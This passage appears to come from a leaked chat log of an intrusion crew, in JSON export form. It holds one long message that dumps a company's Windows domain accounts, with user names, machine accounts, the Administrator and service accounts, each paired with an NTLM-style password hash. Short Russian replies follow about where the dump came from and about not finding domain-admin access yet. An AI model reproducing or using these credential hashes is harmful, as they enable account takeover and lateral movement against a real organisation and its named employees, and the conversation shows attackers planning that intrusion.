8195790b740761023b7e34280db878c5\t512\n1219\ttomh\t78dfc14107c931f730bce53b47dee641\t512\n5627\tITCMA-WS1080$\t708ad4a3223991427f33b6aea5da4578\t4096\n1277\ttrentr\t589b85762d8ab451401df29aa7fdc417\t512\n1122\tdickc\t602a9783f3aa3422f2697b1115da27f3\t512\n2188\tBradB\tdba247aa9535f1d877062d139d04a46a\t512\n8195\tITCMA-LT1070$\t02fd6908bd6d78b6b35b399d3e74517f\t4096\n5348\titcma-ws1094$\t03ab2b6c8260c6c5a89bb1dae3f2ae9f\t4096\n39621\tITCMA-LT1045A$\t652249fc223d285ba5b1df3251c192dd\t4096\n5324\tScottW\t0d242248fffaa41f252e6208536793e9\t512\n8119\tJonR\t6c71c63361f9dc21a430202ab51778ec\t512\n8188\tgrantc\t5bbe84fdc0909a8bf546a43a0e8f51f8\t512\n5691\tITCMA-FILE01$\t0432a09dab08a33ae21a840e783b5b5e\t4096\n4610\tITCMA-LT1024$\teae3eede976d2eb45dd3f3fa53df50f1\t4096\n6617\tITCMA-LT1090$\t9c2d2a7e1bf5a2400e3b9fbf6fb9f773\t4096\n8137\tTroyR\t74ff53312573ba0b4c14a02e699bc783\t512\n5315\tITCMA-WS1085$\t880db01931a6af925d9e16be8df4152b\t4096\n9151\tASITC-WS0052$\tb6d0bdf0d33dd8ff2a4bfb6eff0f232a\t4096\n39661\tjacobc\t94629c257cf1c3484f7ce4b958d58465\t512\n9156\tASITC-WS0085$\t50db7ddeb7f9330fb46080c77e3e57f0\t4096\n40112\tpeacey\t7dfe93aa1c69e0babe9f47d13f1244e1\t512\n9165\tASITC-WS0053$\t4db8640f43556b8bdaf26aada8701513\t4096\n9153\tASITC-WS0057$\t0258d1a53e8dbdec225c8dd4968d604e\t4096\n8138\tAdamY\tf91c84f965aeaa6fa40061c2abf6015a\t512\n9213\tASITC-WS0092$\t77c16a86697dd4b86e34338d732240df\t4096\n9135\tASITC-WS0079$\t074ed936013417af38e68ac259455aaa\t4096\n9169\tASITC-WS0087$\t71c821d37d1ad6b1ad0c470819d55ecc\t4096\n6616\tkrist\t589b85762d8ab451401df29aa7fdc417\t512\n40136\tmaxz\tddf78b035828826e543a46b39136e719\t512\n40140\tsonicwall_sslvpn\t68d8b93b306e84fbc9cafbdc4862e245\t66048\n5345\tCharlieS\t8b614a4fa418d5dba77fe0507be8198f\t512\n9168\tASITC-WS0022$\t2cc6319c387e51328fec80047fda3980\t4096\n1290\trickyc\t8992599c3eb657280f275c08e2053ff9\t512\n9186\tASITC-WS0008$\td4ff1162d4facc94781f959a1fbb5941\t4096\n9164\tASITC-WS0062$\tf4fdab0da2b779bdd983bc2d46611985\t4096\n9202\tASITC-WS0083$\t0643a9a37b5e27d2cd214b646f6b66e6\t4096\n9200\tASITC-WS0017$\t57087e094812b9580cd506a0c4b26393\t4096\n9157\tASITC-WS0065$\t28df06b223c9d6d67127a5eff355f250\t4096\n9183\tASITC-WS0076$\t4419874956a21e8bc8b94415a69caa1d\t4096\n5116\tnickn\t5ad8dfa79777ae85e3a9198994afc79b\t512\n9180\tASITC-WS0003$\tb1a85968fc759735ff51fcbdfbacdf75\t4096\n1723\tVincenth\t77821fad0a661be0ba6605ad032bc674\t512\n1227\tinfor\t9d9f65e7770f2eb4a9a9922785a37026\t66048\n39641\tjendyl\tac73e3569312c470c1173050f9763713\t512\n5141\tellisq\tef5a55e8e2c597fb2274a0db179de291\t512\n9143\tASITC-WS0012$\tc2aa049aca815fa017ceb9b35ac573eb\t4096\n2200\tITCMA-RDS01$\tc2b76ea483a7b734fe9b809c505454b1\t4096\n5651\tMartinZ\t1d0c3a53e095f1de8aeac193fc50a1fc\t512\n9158\tASITC-WS0066$\tb5790d71ccb65d5f0a173dfa6af9f5e7\t4096\n9163\tASITC-WS0058$\t785c911425e4dba6650253bd2e6adfa4\t4096\n5307\tSpringL\t4c3879fef394fa5dce0037c197c70841\t512\n9149\tASITC-WS0042$\ta2e739b1a844c342cd53b990e30349eb\t4096\n9182\tASITC-WS0060$\t374be92c8d690faf9152ecabcee56bb8\t4096\n5337\tLilyY\ta3d7d25665f1146b56192b850fd57a93\t512\n1722\tKennetht\tac73e3569312c470c1173050f9763713\t512\n9172\tASITC-WS0005$\t9e57afffcbef2ff80156c6f45eea94d8\t4096\n9215\tASITC-WS0100$\ta0dd5d2ac2fd77398d34022ad30af4cd\t4096\n9185\tASITC-WS0015$\td004d9a9552304e9c3e17401a8d1b741\t4096\n9145\tASITC-WS0011$\tcbabe431f02624d2aeef9f20dccff406\t4096\n5355\tjennyh\t0c6ee318d17ec8350c0e4072c7598688\t512\n9117\tASITC-WS0047$\t2178a6041d81a4db6e93ebdb60bdad93\t4096\n9195\tASITC-WS0018$\t4b15087c8ba463248e601e8d3bc12d58\t4096\n9128\tASITC-WS0041$\tbae8e6cca6cca90b76a169c8e30ded1c\t4096\n1109\tjenniferl\ta13fe7d09755075eac80a205bb64fe5c\t512\n8196\tjerryh\t3f05f368eb0a6355e7071fb1bd1772f1\t512\n1108\tjohnp\t76cf8d1787696fa522b1b41876d1bf11\t512\n9171\tASITC-WS0002$\t526eb819e509b9d36f19884cd292f0eb\t4096\n1112\trockyx\ta243ea0a666107e5946362230e328cf3\t512\n9218\tASITC-WS0103$\tf361e82f7477397813e7518335030dbe\t4096\n5685\twarehouse4\ta243ea0a666107e5946362230e328cf3\t512\n8146\tLilyW\tac73e3569312c470c1173050f9763713\t512\n9192\tASITC-WS0091$\t8057ddd7385e20cf72b03467b71b1055\t4096\n40125\tangelad\tcef2eb521883d390b32b0b5bb916f7bb\t512\n9224\tASITC-WS0124$\te601c71b66cfbd841c2205369019bd12\t4096\n9222\tASITC-WS0107$\t65e14c85412376d5466beabd34bef078\t4096\n5675\tTomX\t91e049ff1cde360a572baa9e56ad06fd\t512\n1114\tleoc\t150180de61e3227350ff3d5071491db8\t512\n9122\tASITC-WS0038$\te1ae58f2ddce651ba004a6e50e58b365\t4096\n9154\tASITC-WS0019$\t17d89c904db18d8891450f73e9c1102e\t4096\n9133\tASITC-WS0028$\tbdc3f3e7df71268bd68f2e7a0ca210d5\t4096\n9196\tASITC-WS0074$\td948dbd6bc6ecd5fb22b8b9a01c7f02b\t4096\n9179\tASITC-WS0007$\tb74c2aacf8a4c93d4f4e0ea8e3b5ec7c\t4096\n5342\tnk_admin\t27d2802e45ca182a36a973e1196d3140\t512\n5674\tITCMA-WS1103$\t79dae924620dc3597721c8fb781b0418\t4096\n1721\tGeorged\t589b85762d8ab451401df29aa7fdc417\t512\n41106\tMSOL_ee11aef66e2f\t6c03524467d457057285375c927dc454\t66048\n5656\twinniez\t768b312e7c14f5ee736e9d4034e0f305\t512\n9173\tASITC-WS0082$\tc50ff420363cc0c2c3754d1a8cea8816\t4096\n9134\tASITC-WS0029$\t61e3b015e1181c6dd1e9d63c617e4e11\t4096\n2214\tITCMA-WS1069$\t5d46cf0d0441efdfc1f5f87e01c6fefc\t4096\n6605\tJasonC\t3dbc75a400cd00a0bc8cf4e0c224942b\t512\n41113\tITCMA-LT1089$\t8882bc0e7054dea98c44e3ee950ef70e\t4096\n8128\tMaxW\t2e15903e952c12546b70e040e2c0108f\t512\n40124\tvaleriet\t1d06532226cfd222dfe7d3345a624002\t512\n1121\tsueb\tcef2eb521883d390b32b0b5bb916f7bb\t512\n1712\tkathyor\tb5fb31b1e2fb8c139e6bcac28bcd7441\t512\n39646\tjohnnyp\t045d0f10ff8f7211af43cd83c57dfbb1\t512\n40181\tITCMA-PDM02$\tfee7c0bec5318d556fcd6d24a24d2409\t4096\n39687\tITCMA-PDM01$\t48f7baea11ec5f7a38ddbc5fc0846999\t4096\n39696\tITCMA-LT1084$\t4f441d3427ebda9bf1fd27bc28c21d56\t4096\n9170\tASITC-WS0006$\t49e58bf3899318799d2eda67e1fc454c\t4096\n9221\tASITC-WS0117$\t58dc929f38be59ba560603bef738da95\t4096\n9116\tASITC-WS0048$\t2b9b4cc96125ddfd7a21f82eb0d75281\t4096\n1226\tITC-SHIP01$\t02e9d34a1fc453dfde9912a0e71f48df\t4096\n39640\tmits\t5c31c260d6ffad231aa02fb4dd4fba5c\t66048\n5625\tITCMA-LT1036$\teb8b49dc77472c0c525444cb926ce22f\t4096\n8166\tbr_admin\t555601b2d489ec2bfb7d189544736c8b\t512\n5673\tITCMA-WS1102$\tf4cba060887dba209fd64aeef486c7a9\t4096\n8167\tITCMA-LT1067$\t858962301f26159a8fda2486219079a6\t4096\n8152\tToddD\tf2a808efade793dd9d6c5c5e0f5a3fdc\t512\n9174\tASITC-WS0077$\t14eca4102e70e7893ab9172241b26771\t4096\n40190\tASITC-WS0102$\tff3a54a4f043a3ae507a89f12d9c3baf\t4096\n8154\tPeanutW\t785e7255bf1d30e599ee84d67a732a3a\t512\n39669\tclarkq\t496d433763519e769c9e959d0924814f\t512\n9214\tASITC-WS0099$\tf4eb1fb33d94882c1971b6e44f180e2b\t4096\n9115\tASITC-WS0050$\t21b24694208f2fad3efbbe88a0fc4264\t4096\n9140\tASITC-WS0025$\t084e4246aaf6f222d11ea232c9ca4e4a\t4096\n9132\tASITC-WS0027$\t631d50d60830b86b79cb04b5428b9e3a\t4096\n8122\tArongQ\t4874a28a01c2867178c6c744bd982e83\t512\n40202\tauto1\tb51746b3157de258a4084869a9be10d6\t512\n1677\tscotth\t20b2ef7e67106f082391db8fe87ae03d\t512\n8136\tSoffit01\t71554f0a11b6b0fcd545dabe2b6df955\t512\n8181\tmarieb\t09774c752585c14081b2afa7422942b9\t512\n41604\tASITC-WS0135$\t2bba96e281a7a70c6e9b6486fc012110\t4096\n5661\tYvanL\t1e09a46bffe68a4cb738b0381af1dc96\t512\n5659\tcindyl\t1e09a46bffe68a4cb738b0381af1dc96\t512\n9147\tASITC-WS0004$\tcb151889a847f2585920a641009d8b20\t4096\n40131\tbeel\tac73e3569312c470c1173050f9763713\t512\n5346\tFlorenceP\td30b4866d451361d8f2ef374b873eeac\t512\n40207\ttinag\t589b85762d8ab451401df29aa7fdc417\t512\n5638\telkprod\t7d6b2947a290a276376814e7a382e518\t512\n5136\tITCMA-WS1099$\tc6ded49ecb1e547cb7f4247947968e8d\t4096\n41608\tASITC-WS0168$\t1dd47ec61c86ff0c314245519040568d\t4096\n41606\tASITC-WS0129$\tc7e2b80355118c4116900d886fa8625a\t4096\n1123\tmikec\tc675d9a7e3e2c28fa987d3ba0a0a83c5\t512\n2149\tITCMA-WS1052$\td053d2956e5c94d062b6979871c7f6db\t4096\n41607\tASITC-WS0139$\t4280ad0e0d239158263d251caa1f539d\t4096\n9113\tASITC-WS0045$\tee5a60769be509dd954b6bbebc1b96ad\t4096\n8180\tegl_admin\t08b0ec954a94d3c7f1824957bf3fde72\t66048\n5217\tITCMA-WS1063$\taed367e6acd55efca95bc451cd8d436a\t4096\n1315\tkellig\t05251d1bc8c5176e98d77404b43f11dd\t512\n2171\tAITCWarehouse\t589b85762d8ab451401df29aa7fdc417\t512\n8605\tASITC-FILE01$\tdb2d3d53d41734ab634cd39b439dea46\t4096\n1732\tmichaell\t346f769ad1eec38fda1501b164ab401c\t512\n1668\tLABUser\t9b665ada5fe4dbfa9ff997bf50fba587\t512\n39670\tannaz\t9dd6d72708017033107d5dc64b0183b5\t512\n1646\tITC-SQL01$\t96c0ec400f7d4bb868c703070b630d73\t4096\n1124\trhondav\t7dc8d897357047e77c496232457e6c29\t512\n8198\tsydneyv\t7d478a98cc76ac41dad5d0e295d1256e\t512\n2174\tOpenDNS_Connector\t5b2adf3cc355fa00012dec6642fbcb23\t66048\n5304\tSuzanneP\t7fbffce5d584353c32eebbffed8185a6\t512\n1278\tITC-PLM01$\t83bd68b61581913288aceb9207d00153\t4096\n9162\tASITC-WS0068$\t731b03852edd2b45a7b02dec39495698\t4096\n9178\tASITC-WS0088$\t8d2d8d6525886b6269a4a15b8771c7c4\t4096\n9114\tASITC-WS0049$\t4002bbd6b1f12639a53928babd87397b\t4096\n1291\tmermaidm\t4aa448e40457ecfffabc454d5d814c95\t512\n9159\tASITC-WS0064$\teccafcb76beba90f9d281b6f29b8ae77\t4096\n5253\tMarkS\t4c3879fef394fa5dce0037c197c70841\t512\n41110\tITCMA-LT1088$\te6643c134cdbf7ed2842d36d9c123ee3\t4096\n1308\tSophias\ta20c55fc8a97620cb7da82cdd8a2123c\t512\n1321\ttonyz\t6439b5c22963a7d3fdcdbef2e14ea64a\t512\n9120\tASITC-WS0033$\t9cd945dca0ba209fc0420a249468e746\t4096\n9203\tASITC-WS0035$\t528aa4c85745626b54e882c86df6f852\t4096\n9155\tASITC-WS0067$\tab87aa7e043bfe66f6dd4f3a7668d336\t4096\n9209\tASITC-WS0094$\t03d46c1589497bdc00197af7a585bf6c\t4096\n9141\tASITC-WS0078$\te87df5023472150321e8d94f0ad63042\t4096\n9130\tASITC-WS0081$\t48de5b4ea9e4a711b9016974260496fa\t4096\n9197\tASITC-WS0037$\t2c71afbc106dcdb8c022a7409596dcb3\t4096\n8159\tJasonCh\td3f705cd89b4db9b8a53ea79cb257a8a\t512\n5664\tITCMA-LT1055$\t267a1360303abd9f695fc64cde07bbba\t4096\n1241\t!SSL_ServiceTsk\t3609c62b8990d85ab713ae6ed77cebcf\t66048\n40177\tjettl\tc227421e8189a063150b39c603117530\t512\n2191\tITCMA-WS1058$\tcef74a97bec5eadbb408b249945e1e65\t4096\n39622\tITCMA-LT1072$\t97228631d61bb16f6cf13544a55efc10\t4096\n5223\tITCMA-WS1071$\t1fbfa869ed00234c349abb280cc83698\t4096\n5252\tJuanC\t687f1627e4133d362f03d6ac6ea53892\t512\n1667\tCARTUser\t1028fc03c240cc8ed70ef354339a697e\t512\n1664\tUPSUser2\taf35b144ffee4878102b3c9f7773468b\t512\n2180\tScottM\t414a88ab17458ae38689100c7c974642\t512\n39643\tITCMA-LT1077$\tc988f7c681ac0211e847c1d303b205f3\t4096\n39639\twillm\ta19256a8c37fcc358b4fac9a6e237653\t512\n5312\tITCMA-LT1048$\t1513a6fc88d006311487115cb1934c39\t4128\n40147\telkreceiving2\t49e4d01ff1faa8e66131e8b362d075f2\t512\n9106\tbkupsvc\t7b692769ffe8f2c80bb8e798aab2ac48\t66048\n5227\tITCMA-LT1031$\t89666bff1c661f261c3ecdeebd1bd38b\t4096\n5191\tITCMA-WS1026$\t497bc36751be11660d072a284c2d83c0\t4096\n5150\tbrads\t48422d9ccd934cfb5fcebbca5856b31c\t512\n1676\tgarya\t12296e0eadce1f32677002ffe3eb1778\t512\n1675\tMelissas\t61b9d9d533e8da9787c1627f99bddac7\t512\n5138\tmarilouc\t42cd437089c9e91e34b98e6b6aa71663\t512\n5130\ttodds\t34f348628cd5172b706c4c163f83cfa6\t512\n40198\ttessr\t921b9f2cb24f8b52b4c89d3a2de3cebd\t512\n2212\tITCMA-WS1067$\t387ebcc0fdc7309aeeae09670c00c2cf\t4096\n5684\tITCMA-LT1069$\tc26ac2fd55e96cf0b8480f5c92c66526\t4096\n40189\tITCMA-LT1085$\tc4ec35eb1c9edfa3483e4febf769a070\t4096\n40185\tjimb\t56f7cf5782cdcf19a42f83036b4e5b05\t512\n5672\tITCMA-LT1065$\tf2de5fb7c429f931297045d9e52b44d9\t4096\n2162\tteds\t59a871f3c39563e85f2d07302518e951\t512\n8148\tAndrewF\t8f46bf799df8b659cd8bc5fc0bcb35e4\t512\n5204\trebeccan\t51fa7c7a2a313ff469ec7cb18dedc78d\t512\n41107\tryans\t4752c1db828ba42e9628c32670caa28c\t512\n5650\titcma-ws1093$\t03b59aac9e774188c8ddb8d58e9c7128\t4096\n5295\tITCMA-LT1042$\te856e89c5f9ebd71836490cb33394ee4\t4096\n5645\tITCMA-LT1050$\t9f6f53647ac22534ea43a801a2eb40c3\t4096\n39692\tITCMA-LT1082$\t4c3197b8b85c3d6814e97f58eb233cb7\t4096\n39690\tITCMA-LT1081$\ta89faaa8ee2bcd2443302d0006db4722\t4096\n1119\tchrisf\td9227d4a4e8a9cb2014efd590f77537c\t512\n8165\tbenr\t3de6554c573264dbff829c49e5b1c3ab\t512\n8142\tITCMA-LT1059$\tca7966e9f54b6409a1b112dc179d5463\t4096\n41111\tITCMA-LT1039$\t6c4aed3d1097167d27f836b37c009f59\t4096\n5290\tmikea\tf74af2c3225468e8e55138ae7f3f756b\t512\n5215\tscantofile\t746b183cfa4a8f712aa6ddf24e35ade0\t66048\n5666\tITCMA-LT1058$\t55e4a0a3413aae1578ec870067332c0e\t4096\n1338\ttoms\tb6c8dfb9384e1aff6b0c96ccf5d3d372\t512\n8173\tITCMA-APP02$\t4151587ab998907f94b31263d862b52c\t4096\n5339\tITCMA-FILE03$\t4db2224454be54de4890997f7642413a\t532480\n9175\tASITC-WS0089$\t23f0a7ae78467993f666d3c9390f53aa\t4096\n1666\tELKUPSUser2\tdc4b02eb894f18b53d78197c8ffe024c\t512\n1714\thmi\td9c5f9142b2ebb0db74a4bf1be1f5a92\t512\n8174\tITCMA-SQL02$\ta242663b6b7919475b979455d02b6ef9\t4096\n40179\tdamyw\t3f5b3dba0b2001c5dce2206657de659d\t512\n8129\tPerryB\t82775d998ec703e7641b1b6a9f754afc\t512\n1148\tshipping\td1fd53f75570fdcd068131bfe9bba98c\t512\n39699\tADMIN-WIN10$\t74c4be79cbd55618f3d03d61d3e6e155\t4096\n5222\tITCMA-WS1068$\tae91c6879c8b788f20d321293ca0687d\t4096\n1253\tUPSUser\taf35b144ffee4878102b3c9f7773468b\t512\n40205\tITCMA-LT1075A$\t37dd9d6b0946ad54fd0363b0423961df\t4096\n5233\tMichealL\t305367a78b9da467f8a51bcebeba14f3\t512\n39605\tDESKTOP-2K97RKS$\ta4dcf170edb8f1bb5d74b87fde6e7a5f\t4096\n8131\tITCMA-LT1056$\ta3a15993129dee61e4ed21218ec11e0b\t4096\n41114\tshelbyf\t73cc477f6f9f435b260d82064832a452\t512\n1142\trebeccav\t366f6b114b44d6e45517809707c36be1\t512\n5173\tdirrickf\t0ecbe5adf5d974ddaa39619a13cd7ab4\t512\n5220\tITCMA-WS1066$\t40a077add23aa2ebdb5818bd031bf307\t4096\n5231\tITCMA-LT1033$\t74855c5256c06c1ee98279a08c8d1763\t4096\n5286\tITCMA-LT1037$\te86ab9c34a6b34c3a62818cfe0e12691\t4096\n8604\tASITC-APP01$\td0881c6838886a9e66ff37978e63833f\t4096\n9146\tASITC-WS0080$\t9ec15af2f32331f7487b26562cc42705\t4096\n1110\tkittyl\tb996e84bb89f6220f5c3807565b6b7d0\t512\n2154\tdannyz\te7b74e7fab85bf87e19970c2bd85ea49\t512\n5148\tlenay\tacbfc03df96e93cf7294a01a6abbda33\t512\n5325\tMinaL\t1e09a46bffe68a4cb738b0381af1dc96\t512\n2208\tkayl\t6e4b9a5b9d3b7848e7335a0b8fdfc80d\t512\n40134\tsamh\t4c3879fef394fa5dce0037c197c70841\t512\n9177\tASITC-WS0090$\t62b7dba943140ed72486e7563a2cd8b9\t4096\n9105\tITCMA-ENG04$\t308e6f0d0c31d0028c5e0c6fd7408b4b\t4096\n5146\ttommyl\t589b85762d8ab451401df29aa7fdc417\t512\n9194\tASITC-WS0026$\t86a0ab4dc8c7525214fc0da20626bc65\t4096\n5626\tITCMA-WS1079$\t50441517b15a4c83e9609d858809dd47\t4096\n39638\tinfor_edi\t1941c372c3c802defa0af03fddf10c04\t66048\n1309\tDavids\t8ee8bf3b64f0064eb92f217c772537ca\t512\n8140\tFrankM\ta0c046c39e44cf25dd13b64a0ad76ba2\t512\n39650\tyvonnew\tac73e3569312c470c1173050f9763713\t512\n40186\tits-macbook-pro$\tc629fa10ebdf80214797d0e23faa41b3\t4096\n5635\tITCMA-WS1083$\t3404ebdbb4e84243145f7774264f71b7\t4096\n40148\tbriang\t1d32ad40cecbc0419f99a08e0845dd66\t512\n40184\tjamesong\t5edca7360010cbc2ab0fead3aabe956f\t512\n40209\tangelar\t16a1285d0f4e4a0cf054c6352a0c095d\t512\n40208\tsergiog\t00c1f9555484a4e195f8b94505ccdbd5\t512\n40210\tamberg\t59fdc659b9880d993a329bc756a42256\t512\n41120\tshenandoahv\t87dcfbfbfeea7f85a43957e0850834ab\t512\n39648\tdevb\t4bf03c4aa37d8389cacc45e526aa0b38\t512\n40211\tmichald\t6ccc06be81b8b09d60079974ba9db2bb\t512\n8169\tITCMA-WS1104$\t5953e40b3938b0fb62208022d39eb9e9\t4096\n9125\tASITC-WS0043$\t87ec000a514789bec89fd918899fcfd6\t4096\n1218\tlaurac\tbfaac897b28785368be4da98b9a0d0a6\t512\n1136\tmiket\tb62f3243655382a981101440602b41f1\t512\n6615\teagle\t7b692769ffe8f2c80bb8e798aab2ac48\t66048\n9181\tASITC-WS0056$\t1aa89d969639fccdfb04791007978d53\t4096\n40118\tITCMA-LT1071$\t541bcadfd13d7e3ade7a096a93d7dd2a\t4096\n41109\tmakennav\ta994e5abc8147600c5d0583d7b6eb3ec\t512\n8111\tITCMA-WS1096$\t5808f63ae3602b42bdfa6850c16946b1\t4128\n41121\tkevink\tac6cd6418d4c26a045130e375a3c506b\t512\n1725\tKevinz\t3dc28ff71f35d8e9710efc8b4cf806de\t512\n5636\tITCMA-LT1046$\t557e5ffbee69f8230c459e0152360bd9\t4096\n1225\tITC-APP01$\tc540266f62332be049066bb283de2ad0\t4096\n2213\tITCMA-WS1070$\t9801015586f63e13b511204bbc41414d\t4096\n9160\tASITC-WS0070$\t7d75195cf0e25398cdfe6cf6ba42de89\t4096\n8164\tRubyZ\ta882591c875ae54533fc6f14fa6173ce\t512\n40137\ttobyz\t199b266b3092ea1efee1d81a017c481b\t512\n1282\tsherryl\tafc5283b49e82c8ac72f89b82be0f758\t512\n2186\tjackyh\t0672f1fd9d5ab94d376cc2a43ef892fc\t512\n9184\tASITC-WS0014$\t0999c110034768046023751e6ba1ce78\t4096\n40132\tnicoc\t589b85762d8ab451401df29aa7fdc417\t512\n5211\tbilll\tf37ab74d11ba8d794987fab03a58403c\t512\n1325\tNancyZ\t132c1e433f064060a370c0e9c4d28eb6\t512\n5335\tDarayC\t4cae4b4e9d177b0bf725b62226abf740\t512\n8149\tJackZ\t06a750a192abd9537ed8686d08b02f49\t512\n41605\tASITC-WS0136$\t1cbf5953a90d46ce8f8de3d82c2135db\t4096\n40145\tITMCA-LT1080$\te67e8dc0b3b37509aa60815ba37da4d7\t4096\n9131\tASITC-WS0072$\t53167030a37271d9246a7aa7327d7f68\t4096\n5688\tASITC-DC01$\tbeb8bb0fdd50b87ba48bd979b54736b8\t532480\n1636\tdavidr\t247f65d89f9abe6f85da87fef9c84eba\t512\n39700\tITCMA-PRINT-SVR$\tcfcd4fe5685597b9476ec1f2b92a2667\t4096\n8157\tWarehouseLeader\t8aa0f378d8599eb42b0156c7b8f981e0\t512\n5639\tITCMA-LT1049$\t0b5e0acef3de4fef2d12b21bf83ecfc9\t4096\n5629\tITCMA-WS1081$\td0451c2ba33b521925ea2837957019a6\t4096\n1149\tandrewm\t41b055063b922eb200e05e0665216900\t512\n39631\tITCMA-LT1074$\t0b1683f6e9a8caa5128f8d1d0f77c49e\t4096\n9204\tASITC-WS0086$\t04a2fbac7c05f2d0b3222b36f5c773c9\t4096\n5630\tITCMA-LT1044$\t30149233998aa92322877831261ecff6\t4096\n9176\tASITC-WS0073$\t9b76cb2971784e4c5aa6e69d65cf3dd6\t4096\n5640\tITCMA-WS1089$\t29b5e841b13e010e4259fa8f8a75ac71\t4096\n1244\tPhilipb\tc6e7e05b483681c06169eda2c48689a9\t512\n2197\tElkreceiving\t88f15581c12034e22387d5525101a892\t512\n5663\tITCMA-LT1052$\t4b27ff15193a56cf72d1784da5c7be35\t4096\n40143\tITCMA-LT1078$\t8cfdcc1544a281d08061ca6731549319\t4096\n5331\tITCMA-WS1086$\ta66e29ae4c6eff3d2c1bd4502b9470b7\t4096\n5316\tITCMA-WS1088$\t6eb66e69da9559da92f3a046b451db30\t4096\n39652\tITCMA-LT1079$\t0f106efcb1fc0d3dc123eda3b03d6a44\t4096\n8176\tchrish\t4c605d1a2ec161770816400927e35c1d\t512\n1135\tgreggh\t6bd042586c6b3caef7e03d25f260b84f\t512\n39645\tITCMA-LT1076$\t7d3296432028512ab4902608888a5030\t4128\n9107\tITC-PLM02$\t84747a0bd7330d7388f82ebf5a4f6242\t4096\n40194\tITCMA-LT1086$\ta742bcefedbcabee3487056dbc8ee4a4\t4096\n1222\tdavem\tc5af95985a288dc02cbfe9f08d56c57a\t512\n5653\tJasonH\te8ef93628fd7148f2833e7b48a1610d4\t512\n40201\tITCMA-WS1100A$\te4793f7b063d95a910f84d864c3855f2\t4096\n5344\titcma-lt1051$\t3131c041b16fd74e822bdbd7ce33e74c\t4096\n1128\tbillm\td1b753453d1babe132217d7e3d738e36\t512\n39663\tfreshservice\tf50ea5bf6666b0901306e8db471c80f6\t512\n5668\tITCMA-LT1061$\t525a9ad3108afe8c93e4041550915221\t4096\n2204\tcassiel\td37001504f330930271fa40863ad0977\t512\n5172\tITCMA-WS1059$\t44a1d1bc8cadd009439c398c5f99c4be\t4096\n40203\tkarolynk\tc62f11452548e5860f8df083a488d378\t512\n40196\tITCMA-LT1087$\t2b358ce837969534ae4c11be8f668783\t4128\n9167\tASITC-WS0023$\t5fe2cd8c82a551c163a2f32bd361c3dd\t4096\n8118\tEllenL\t1ee6b8270b6eee2a9a06b7b49efaee4b\t512\n9148\tASITC-WS0059$\t6de2a3f710075ab0c368fcdd754ab957\t4096\n2168\tPeterP\tb7e98d67d450a6e8cc7c6cccc2c7259b\t512\n2170\tbellaf\t589b85762d8ab451401df29aa7fdc417\t512\n8150\tShannonR\t4478251daf3dd7961b805f5fd1306fce\t512\n5334\tITCMA-WS1092$\tb5f1809435b128ced7a8c956b86c7976\t4096\n41112\tlunah\t589b85762d8ab451401df29aa7fdc417\t512\n9166\tASITC-WS0024$\ta2f51875d8c47f9d40a8a0cd440069a8\t4096\n5209\tSQL_Services\t0a439b9c925710be50b7cb1f2e66a37e\t66048\n1289\tstevel\t2d065f436e8300d30e05e552e266c5ef\t512\n9191\tASITC-WS0054$\t5fc55ecf64adce9ff593de9b7951d1f4\t4096\n5240\tITCMA-FILE02$\t12b0ed1384146ccffd020f39378aad6a\t532480\n9220\tASITC-WS0118$\tdcc6caa17f7df07b458a75c2435c12ff\t4096\n39701\tITCMA-RDS-SVR01$\t7d527a538c39f4f4d47342fe34af527f\t4096\n5287\tAlanS\t08475e239783c166d5c35f940a15ffa5\t512\n1137\tsuellenc\t7c98ab757299b4e6b102e8b6db6db33b\t512\n5326\tDennisZ\t41be95cb06542e4dde52784e49735921\t512\n41609\tASITC-WS0201$\tcf1f80af2f1a8279fda86ad90074a235\t4096\n40192\tITC-DC-SVR01$\t8058ee87cd2e147c2b1b8fa17512ec3d\t532480\n5147\tsmitht\tac73e3569312c470c1173050f9763713\t512\n5634\tITCMA-WS1082$\tafb0631ce1aa2504b7bada2e9bcad27d\t4096\n1133\tkeng\te8568c9ae1e15dacf8336cd6fb5d428e\t512\n5620\tITCMA-WS1075$\t99e4f2fe05a381d12e3248d1938c75d6\t4096\n5333\tPhilipJ\tcef2eb521883d390b32b0b5bb916f7bb\t512\n5299\tSevM\tde7bab8e4b98b6c8b6287085f73c8592\t512\n5282\tITCMA-LT1038$\t3b54a3c420e79658948fc617847cf88d\t4096\n5309\tJudyB\tff85c532cb37f917934ae5de662ef493\t512\n8120\tITCMA-LT1053$\tce92e3e6689888cb084c45f67a882a54\t4096\n1125\tchars\t8d0491b148a4a8e097a51f426b437d42\t512\n8184\tbrandent\tfced468d4c2103847b007cb4765c6e55\t512\n8182\tITCMA-WS$\t7e407f2c3e54dc2744b30185b7ad9c46\t4096\n500\tAdministrator\t0cc0cdacd8aa7f3b06e7cdfffa909b11\t66048\n5281\tSandyM\t1d73e704a42de6cfd317b0f88a4e658c\t512\n1719\tjamesn\td6c67163e32e3dac2b782c87ade65ad9\t512\n41118\tITCMA-LT1091$\ta41dba55bb5c31b134ec2739a79e5e1d\t4096\n40171\talyssaw\tc510df06d92c28c967cf18634b068468\t512\n40127\tITCMA-MITS01$\td78c60dab4360d4056284e568ee8823e\t4096\n```",
+      "ts": "2020-10-16T17:22:09.311Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T17:22:10.994Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uNsfS6cXYsGNHKeJZ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "хде взял",
+      "ts": "2020-10-16T17:16:30.531Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T17:16:30.572Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sFjKfFwJSbjpbFFjD",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "без домена не рисковал пока",
+      "ts": "2020-10-16T14:57:55.626Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T14:57:55.655Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eTmh2xGxbyJPpDHCw",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "нигде администратора не показало",
+      "ts": "2020-10-16T14:57:49.922Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T14:57:49.954Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FSYMztSjdmHkgrnYi",
